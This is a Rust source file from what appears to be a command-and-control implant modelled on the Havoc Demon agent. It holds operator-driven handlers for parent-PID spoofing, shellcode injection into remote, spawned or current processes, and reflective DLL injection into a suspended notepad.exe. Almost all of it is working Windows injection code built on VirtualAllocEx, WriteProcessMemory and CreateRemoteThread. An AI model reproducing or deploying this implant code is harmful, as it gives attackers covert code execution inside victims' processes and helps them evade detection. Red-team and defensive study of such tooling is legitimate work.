//! Process injection, DLL loading, and PPID spoofing handlers.

use red_cell_common::demon::{DemonCommand, DemonInjectError, DemonInjectWay};
use tracing::{info, warn};

use crate::config::SpecterConfig;

use super::{DispatchResult, Response, parse_bytes_le, parse_u32_le, write_u32_le};

// ─── Process injection handlers ──────────────────────────────────────────────

/// `COMMAND_PROC_PPIDSPOOF (27)` — update the PPID used for spawning child processes.
///
/// The teamserver sends a single u32 containing the desired parent PID.  The
/// agent stores it in config for future use by process-creation APIs that
/// support `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`.
///
/// Incoming payload (LE): `[ppid: u32]`
///
/// Outgoing payload (LE): `[ppid: u32]`
pub(super) fn handle_proc_ppid_spoof(payload: &[u8], config: &mut SpecterConfig) -> DispatchResult {
    let mut offset = 0;
    let ppid = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("ProcPpidSpoof: failed to parse PPID: {e}");
            return DispatchResult::Ignore;
        }
    };

    info!(ppid, "ProcPpidSpoof: updating spoofed parent PID");

    config.ppid_spoof = Some(ppid);

    let mut out = Vec::new();
    write_u32_le(&mut out, ppid);

    DispatchResult::Respond(Response::new(DemonCommand::CommandProcPpidSpoof, out))
}

/// `COMMAND_INJECT_SHELLCODE (24)` — inject shellcode into a process.
///
/// Supports three injection modes:
/// - **Spawn (0)**: create a new suspended process, inject, resume
/// - **Inject (1)**: inject into an existing process by PID
/// - **Execute (2)**: inject into the current process
///
/// On Windows, this uses `VirtualAllocEx` + `WriteProcessMemory` +
/// `CreateRemoteThread` (or NtCreateThreadEx / NtQueueApcThread depending on
/// the requested method).
///
/// On non-Windows platforms, no injection is possible; the handler returns
/// `Failed` status so the teamserver reports the error to the operator.
///
/// Incoming payload (LE):
/// `[way: u32][method: u32][x64: u32][shellcode: bytes][args: bytes][pid: u32 (inject only)]`
///
/// Outgoing payload (LE): `[status: u32]`
pub(super) fn handle_inject_shellcode(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let way_raw = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse way: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let method = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse method: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let x64 = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse x64: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let shellcode = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse shellcode: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let _args = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectShellcode: failed to parse args: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectShellcode,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let way = DemonInjectWay::try_from(way_raw);

    // For the Inject way, a target PID follows the arguments.
    let target_pid = if matches!(way, Ok(DemonInjectWay::Inject)) {
        match parse_u32_le(payload, &mut offset) {
            Ok(v) => Some(v),
            Err(e) => {
                warn!("InjectShellcode: failed to parse target PID: {e}");
                return inject_status_response(
                    DemonCommand::CommandInjectShellcode,
                    DemonInjectError::InvalidParam,
                );
            }
        }
    } else {
        None
    };

    info!(
        way = way_raw,
        method,
        x64,
        shellcode_len = shellcode.len(),
        target_pid = target_pid.unwrap_or(0),
        "InjectShellcode: dispatching injection"
    );

    let status = inject_shellcode_native(way_raw, method, x64, &shellcode, target_pid);

    inject_status_response(DemonCommand::CommandInjectShellcode, status)
}

/// `COMMAND_INJECT_DLL (22)` — reflectively inject a DLL into a remote process.
///
/// The teamserver provides a reflective loader stub (KaynLdr) and the DLL
/// binary.  The agent opens the target process, allocates memory, writes the
/// loader + DLL, and creates a remote thread at the loader entry point.
///
/// Incoming payload (LE):
/// `[technique: u32][pid: u32][loader: bytes][dll: bytes][params: bytes]`
///
/// Outgoing payload (LE): `[status: u32]`
pub(super) fn handle_inject_dll(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let technique = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse technique: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let pid = match parse_u32_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse PID: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let loader = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse loader: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let dll = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse DLL: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let params = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("InjectDll: failed to parse params: {e}");
            return inject_status_response(
                DemonCommand::CommandInjectDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    info!(
        technique,
        pid,
        loader_len = loader.len(),
        dll_len = dll.len(),
        params_len = params.len(),
        "InjectDll: reflective DLL injection"
    );

    let status = inject_dll_native(technique, pid, &loader, &dll, &params);

    inject_status_response(DemonCommand::CommandInjectDll, status)
}

/// `COMMAND_SPAWN_DLL (26)` — spawn a new process and reflectively inject a DLL.
///
/// Similar to `CommandInjectDll` but creates a new suspended child process
/// first (using the configured spawn binary), injects the DLL into it, then
/// resumes.
///
/// Incoming payload (LE): `[loader: bytes][dll: bytes][args: bytes]`
///
/// Outgoing payload (LE): `[status: u32]`
pub(super) fn handle_spawn_dll(payload: &[u8]) -> DispatchResult {
    let mut offset = 0;

    let loader = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("SpawnDll: failed to parse loader: {e}");
            return inject_status_response(
                DemonCommand::CommandSpawnDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let dll = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("SpawnDll: failed to parse DLL: {e}");
            return inject_status_response(
                DemonCommand::CommandSpawnDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    let args = match parse_bytes_le(payload, &mut offset) {
        Ok(v) => v,
        Err(e) => {
            warn!("SpawnDll: failed to parse args: {e}");
            return inject_status_response(
                DemonCommand::CommandSpawnDll,
                DemonInjectError::InvalidParam,
            );
        }
    };

    info!(
        loader_len = loader.len(),
        dll_len = dll.len(),
        args_len = args.len(),
        "SpawnDll: spawn + reflective DLL injection"
    );

    let status = spawn_dll_native(&loader, &dll, &args);

    inject_status_response(DemonCommand::CommandSpawnDll, status)
}

/// Build a single-u32-status injection response payload (LE).
pub(super) fn inject_status_response(
    cmd: DemonCommand,
    status: DemonInjectError,
) -> DispatchResult {
    let mut out = Vec::new();
    write_u32_le(&mut out, status.into());
    DispatchResult::Respond(Response::new(cmd, out))
}

// ─── Platform-native injection implementations ──────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod inject_native {
    use red_cell_common::demon::{DemonInjectError, DemonInjectWay};
    use tracing::{info, warn};

    use windows_sys::Win32::Foundation::{CloseHandle, FALSE, HANDLE, INVALID_HANDLE_VALUE};
    use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
    use windows_sys::Win32::System::Memory::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx,
        VirtualProtectEx,
    };
    use windows_sys::Win32::System::Threading::{
        CREATE_NO_WINDOW, CREATE_SUSPENDED, CreateProcessW, CreateRemoteThread, OpenProcess,
        PROCESS_CREATE_THREAD, PROCESS_INFORMATION, PROCESS_QUERY_INFORMATION,
        PROCESS_VM_OPERATION, PROCESS_VM_WRITE, ResumeThread, STARTUPINFOW, TerminateProcess,
    };

    /// Inject shellcode using the specified way and method.
    pub fn inject_shellcode(
        way: u32,
        _method: u32,
        _x64: u32,
        shellcode: &[u8],
        target_pid: Option<u32>,
    ) -> DemonInjectError {
        match DemonInjectWay::try_from(way) {
            Ok(DemonInjectWay::Inject) => {
                let pid = match target_pid {
                    Some(p) if p != 0 => p,
                    _ => return DemonInjectError::InvalidParam,
                };
                inject_into_process(pid, shellcode)
            }
            Ok(DemonInjectWay::Spawn) => spawn_and_inject(shellcode),
            Ok(DemonInjectWay::Execute) => inject_into_self(shellcode),
            Err(_) => {
                warn!(way, "InjectShellcode: unknown injection way");
                DemonInjectError::InvalidParam
            }
        }
    }

    /// Inject shellcode into an existing process by PID.
    fn inject_into_process(pid: u32, shellcode: &[u8]) -> DemonInjectError {
        unsafe {
            let access = PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION;
            let handle = OpenProcess(access, FALSE, pid);
            if handle.is_null() || handle == INVALID_HANDLE_VALUE {
                warn!(pid, "InjectShellcode: OpenProcess failed");
                return DemonInjectError::Failed;
            }

            let result = write_and_execute(handle, shellcode);

            CloseHandle(handle);
            result
        }
    }

    /// Spawn a new suspended process, inject shellcode, and resume.
    fn spawn_and_inject(shellcode: &[u8]) -> DemonInjectError {
        unsafe {
            let mut si: STARTUPINFOW = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            // Spawn notepad.exe as default target (same as Demon's Spawn64 default).
            let spawn_path: Vec<u16> =
                "C:\\Windows\\System32\\notepad.exe\0".encode_utf16().collect();

            let ok = CreateProcessW(
                spawn_path.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                FALSE,
                CREATE_NO_WINDOW | CREATE_SUSPENDED,
                core::ptr::null(),
                core::ptr::null(),
                &si,
                &mut pi,
            );

            if ok == 0 {
                warn!("InjectShellcode: CreateProcessW failed");
                return DemonInjectError::Failed;
            }

            info!(pid = pi.dwProcessId, "InjectShellcode: spawned suspended process");

            let result = write_and_execute(pi.hProcess, shellcode);

            if result != DemonInjectError::Success {
                TerminateProcess(pi.hProcess, 1);
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            result
        }
    }

    /// Inject shellcode into the current process.
    fn inject_into_self(shellcode: &[u8]) -> DemonInjectError {
        unsafe {
            let handle = windows_sys::Win32::System::Threading::GetCurrentProcess();
            write_and_execute(handle, shellcode)
        }
    }

    /// Allocate RW memory, write shellcode, flip to RX, and create a remote thread.
    unsafe fn write_and_execute(process: HANDLE, shellcode: &[u8]) -> DemonInjectError {
        let base = VirtualAllocEx(
            process,
            core::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() {
            warn!("InjectShellcode: VirtualAllocEx failed");
            return DemonInjectError::Failed;
        }

        let mut written = 0usize;
        let ok = WriteProcessMemory(
            process,
            base,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut written,
        );
        if ok == 0 || written != shellcode.len() {
            warn!("InjectShellcode: WriteProcessMemory failed");
            return DemonInjectError::Failed;
        }

        let mut old_protect = 0u32;
        let ok =
            VirtualProtectEx(process, base, shellcode.len(), PAGE_EXECUTE_READ, &mut old_protect);
        if ok == 0 {
            warn!("InjectShellcode: VirtualProtectEx failed");
            return DemonInjectError::Failed;
        }

        let thread = CreateRemoteThread(
            process,
            core::ptr::null(),
            0,
            Some(core::mem::transmute::<
                *mut core::ffi::c_void,
                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
            >(base)),
            core::ptr::null(),
            0,
            core::ptr::null_mut(),
        );
        if thread.is_null() || thread == INVALID_HANDLE_VALUE {
            warn!("InjectShellcode: CreateRemoteThread failed");
            return DemonInjectError::Failed;
        }

        CloseHandle(thread);
        DemonInjectError::Success
    }

    /// Reflectively inject a DLL into a target process.
    pub fn inject_dll(
        _technique: u32,
        pid: u32,
        loader: &[u8],
        dll: &[u8],
        params: &[u8],
    ) -> DemonInjectError {
        if pid == 0 {
            return DemonInjectError::InvalidParam;
        }

        unsafe {
            let access = PROCESS_VM_OPERATION
                | PROCESS_VM_WRITE
                | PROCESS_CREATE_THREAD
                | PROCESS_QUERY_INFORMATION;
            let handle = OpenProcess(access, FALSE, pid);
            if handle.is_null() || handle == INVALID_HANDLE_VALUE {
                warn!(pid, "InjectDll: OpenProcess failed");
                return DemonInjectError::Failed;
            }

            let result = reflective_inject(handle, loader, dll, params);

            CloseHandle(handle);
            result
        }
    }

    /// Spawn a new process and reflectively inject a DLL.
    pub fn spawn_dll(loader: &[u8], dll: &[u8], args: &[u8]) -> DemonInjectError {
        unsafe {
            let mut si: STARTUPINFOW = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            let spawn_path: Vec<u16> =
                "C:\\Windows\\System32\\notepad.exe\0".encode_utf16().collect();

            let ok = CreateProcessW(
                spawn_path.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                FALSE,
                CREATE_NO_WINDOW | CREATE_SUSPENDED,
                core::ptr::null(),
                core::ptr::null(),
                &si,
                &mut pi,
            );

            if ok == 0 {
                warn!("SpawnDll: CreateProcessW failed");
                return DemonInjectError::Failed;
            }

            info!(pid = pi.dwProcessId, "SpawnDll: spawned suspended process");

            let result = reflective_inject(pi.hProcess, loader, dll, args);

            if result == DemonInjectError::Success {
                ResumeThread(pi.hThread);
            } else {
                TerminateProcess(pi.hProcess, 1);
            }

            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);
            result
        }
    }

    /// Write loader + DLL + params into a remote process and create a thread at
    /// the loader entry.
    unsafe fn reflective_inject(
        process: HANDLE,
        loader: &[u8],
        dll: &[u8],
        params: &[u8],
    ) -> DemonInjectError {
        let total_size = loader.len() + dll.len();
        let base = VirtualAllocEx(
            process,
            core::ptr::null(),
            total_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() {
            warn!("ReflectiveInject: VirtualAllocEx for DLL failed");
            return DemonInjectError::Failed;
        }

        // Write loader at base
        let mut written = 0usize;
        let ok =
            WriteProcessMemory(process, base, loader.as_ptr().cast(), loader.len(), &mut written);
        if ok == 0 {
            warn!("ReflectiveInject: WriteProcessMemory (loader) failed");
            return DemonInjectError::Failed;
        }

        // Write DLL immediately after loader
        let dll_base = (base as usize + loader.len()) as *const core::ffi::c_void;
        let ok =
            WriteProcessMemory(process, dll_base, dll.as_ptr().cast(), dll.len(), &mut written);
        if ok == 0 {
            warn!("ReflectiveInject: WriteProcessMemory (DLL) failed");
            return DemonInjectError::Failed;
        }

        // Write params if present
        let param_addr = if !params.is_empty() {
            let param_base = VirtualAllocEx(
                process,
                core::ptr::null(),
                params.len(),
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE,
            );
            if param_base.is_null() {
                warn!("ReflectiveInject: VirtualAllocEx (params) failed");
                return DemonInjectError::Failed;
            }
            let ok = WriteProcessMemory(
                process,
                param_base,
                params.as_ptr().cast(),
                params.len(),
                &mut written,
            );
            if ok == 0 {
                warn!("ReflectiveInject: WriteProcessMemory (params) failed");
                return DemonInjectError::Failed;
            }
            param_base
        } else {
            core::ptr::null()
        };

        // Flip DLL region to RX
        let mut old_protect = 0u32;
        let ok = VirtualProtectEx(process, base, total_size, PAGE_EXECUTE_READ, &mut old_protect);
        if ok == 0 {
            warn!("ReflectiveInject: VirtualProtectEx failed");
            return DemonInjectError::Failed;
        }

        // Create remote thread at loader entry, passing params as argument
        let thread = CreateRemoteThread(
            process,
            core::ptr::null(),
            0,
            Some(core::mem::transmute::<
                *mut core::ffi::c_void,
                unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
            >(base)),
            param_addr,
            0,
            core::ptr::null_mut(),
        );
        if thread.is_null() || thread == INVALID_HANDLE_VALUE {
            warn!("ReflectiveInject: CreateRemoteThread failed");
            return DemonInjectError::Failed;
        }

        CloseHandle(thread);
        DemonInjectError::Success
    }
}

#[cfg(not(windows))]
mod inject_native {
    use red_cell_common::demon::DemonInjectError;
    use tracing::info;

    /// Shellcode injection is not supported on non-Windows platforms.
    pub fn inject_shellcode(
        _way: u32,
        _method: u32,
        _x64: u32,
        _shellcode: &[u8],
        _target_pid: Option<u32>,
    ) -> DemonInjectError {
        info!("InjectShellcode: not supported on this platform");
        DemonInjectError::Failed
    }

    /// DLL injection is not supported on non-Windows platforms.
    pub fn inject_dll(
        _technique: u32,
        _pid: u32,
        _loader: &[u8],
        _dll: &[u8],
        _params: &[u8],
    ) -> DemonInjectError {
        info!("InjectDll: not supported on this platform");
        DemonInjectError::Failed
    }

    /// DLL spawn injection is not supported on non-Windows platforms.
    pub fn spawn_dll(_loader: &[u8], _dll: &[u8], _args: &[u8]) -> DemonInjectError {
        info!("SpawnDll: not supported on this platform");
        DemonInjectError::Failed
    }
}

/// Delegate to the platform-native shellcode injection implementation.
fn inject_shellcode_native(
    way: u32,
    method: u32,
    x64: u32,
    shellcode: &[u8],
    target_pid: Option<u32>,
) -> DemonInjectError {
    inject_native::inject_shellcode(way, method, x64, shellcode, target_pid)
}

/// Delegate to the platform-native reflective DLL injection implementation.
fn inject_dll_native(
    technique: u32,
    pid: u32,
    loader: &[u8],
    dll: &[u8],
    params: &[u8],
) -> DemonInjectError {
    inject_native::inject_dll(technique, pid, loader, dll, params)
}

/// Delegate to the platform-native spawn + DLL injection implementation.
fn spawn_dll_native(loader: &[u8], dll: &[u8], args: &[u8]) -> DemonInjectError {
    inject_native::spawn_dll(loader, dll, args)
}
